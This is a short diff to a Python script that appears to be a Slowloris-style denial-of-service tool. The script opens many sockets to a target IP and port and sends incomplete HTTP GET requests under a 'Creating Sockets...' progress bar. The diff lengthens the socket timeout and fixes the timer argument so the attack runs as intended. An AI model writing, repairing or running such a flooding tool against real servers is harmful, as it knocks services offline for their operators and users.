@@ -32,7 +32,7 @@ faded_text = fade.fire(logo)
 print(faded_text)
 def init_socket(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)
+    s.settimeout(4)
     s.connect((ip,int(port)))
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
 
@@ -50,7 +50,7 @@ def main():
     port = sys.argv[2]
     socket_count= int(sys.argv[3])
     bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
-    timer = int(sys.argv[2])
+    timer = int(sys.argv[4])
     socket_list=[]
 
     for _ in range(int(socket_count)):
